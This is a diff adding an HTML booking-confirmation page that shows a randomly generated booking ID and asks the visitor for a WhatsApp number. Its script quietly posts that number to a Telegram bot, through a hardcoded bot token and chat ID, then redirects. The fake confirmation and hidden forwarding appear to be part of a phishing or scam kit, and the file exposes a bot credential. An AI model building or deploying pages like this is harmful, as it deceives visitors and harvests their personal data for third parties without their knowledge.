@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Payment Successful</title>
+
+  <!-- External CSS Libraries (Font Awesome & Google Fonts) -->
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+
+  <style>
+    /* Global Styles */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Roboto', sans-serif;
+    }
+    body {
+      background-color: #f8f9fa;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      padding: 20px;
+    }
+    .container {
+      background-color: white;
+      box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
+      border-radius: 12px;
+      padding: 50px;
+      width: 100%;
+      max-width: 600px;
+      text-align: center;
+      animation: fadeIn 1s ease-in-out;
+    }
+
+    /* Add fadeIn animation */
+    @keyframes fadeIn {
+      from {
+        opacity: 0;
+      }
+      to {
+        opacity: 1;
+      }
+    }
+
+    h2 {
+      font-size: 2.5rem;
+      margin-bottom: 30px;
+      color: #28a745;
+    }
+
+    .icon {
+      font-size: 60px;
+      color: #28a745;
+      margin-bottom: 20px;
+    }
+
+    .message {
+      font-size: 1.2rem;
+      margin-bottom: 20px;
+      color: #555;
+    }
+
+    .booking-id {
+      font-size: 1.3rem;
+      margin-top: 20px;
+      padding: 10px;
+      background-color: #f0f0f0;
+      border-radius: 8px;
+      display: inline-block;
+      color: #007bff;
+    }
+
+    .input-container {
+      margin-top: 30px;
+    }
+
+    .input-container input {
+      width: 100%;
+      padding: 12px;
+      font-size: 1rem;
+      margin-top: 10px;
+      border: 2px solid #ddd;
+      border-radius: 8px;
+    }
+
+    .support {
+      font-size: 1.1rem;
+      margin-top: 30px;
+      color: #007bff;
+      font-weight: 500;
+    }
+
+    .button-container {
+      margin-top: 40px;
+    }
+
+    .button-container a, .done-button {
+      text-decoration: none;
+      background-color: #007bff;
+      color: white;
+      padding: 12px 30px;
+      border-radius: 8px;
+      font-size: 1.1rem;
+      transition: background-color 0.3s;
+      display: inline-block;
+    }
+
+    .button-container a:hover, .done-button:hover {
+      background-color: #0056b3;
+    }
+
+    .done-button {
+      cursor: pointer;
+    }
+
+    /* Success message */
+    .success-message {
+      display: none;
+      margin-top: 20px;
+      color: #28a745;
+      font-size: 1.2rem;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="container">
+    <div class="icon">
+      <i class="fas fa-check-circle"></i>
+    </div>
+
+    <h2>Booking Successful!</h2>
+
+    <div class="message">
+      <p>Your appointment has been successfully booked. Please note your booking ID for reference.</p>
+      <p class="booking-id">Booking ID: <span id="bookingId"></span></p>
+    </div>
+
+    <div class="input-container">
+      <label for="personalNumber">Enter your 10-digit mobile number (WhatsApp):</label>
+      <input type="text" id="personalNumber" placeholder="Enter your 10-digit mobile number" maxlength="10">
+    </div>
+
+    <div class="support">
+      <p>Need assistance? Contact us at <strong><a href="tel:+918389020588" style="color: #007bff;">+91 8389020588</a></strong></p>
+    </div>
+
+    <div class="button-container">
+      <a href="index.html">Back to Home</a>
+      <div class="done-button" onclick="sendToTelegram()">Done</div>
+    </div>
+
+    <div class="success-message" id="successMessage">Booking information has been successfully sent! Redirecting...</div>
+  </div>
+
+  <script>
+    // Generate a random booking ID
+    function generateBookingID() {
+      return Math.floor(100000 + Math.random() * 900000);
+    }
+
+    const bookingId = generateBookingID();
+    document.getElementById('bookingId').textContent = bookingId;
+
+    // Send the booking information to Telegram bot
+    function sendToTelegram() {
+      const personalNumber = document.getElementById('personalNumber').value;
+      if (personalNumber.length === 10) {
+        // Display success message
+        document.getElementById('successMessage').style.display = 'block';
+
+        // Send data to Telegram
+        fetch(`https://api.telegram.org/bot7701358792:AAFLkI85hoxRhRqCsiJgClE9na_5M-BmxxY/sendMessage`, {
+          method: 'POST',
+          body: JSON.stringify({
+            chat_id: "7490634345",
+            text: `
+              New Appointment Booking:
+              Booking ID: ${bookingId}
+              Payment Successful!
+              Personal Number (WhatsApp): ${personalNumber}
+              Contact Support: +91 8389020588
+            `
+          }),
+          headers: {
+            'Content-Type': 'application/json'
+          }
+        });
+
+        // Redirect after a short delay
+        setTimeout(function() {
+          window.location.href = 'first.html';
+        }, 2000); // Redirect after 2 seconds
+      } else {
+        alert('Please enter a valid 10-digit mobile number.');
+      }
+    }
+  </script>
+
+</body>
+</html>
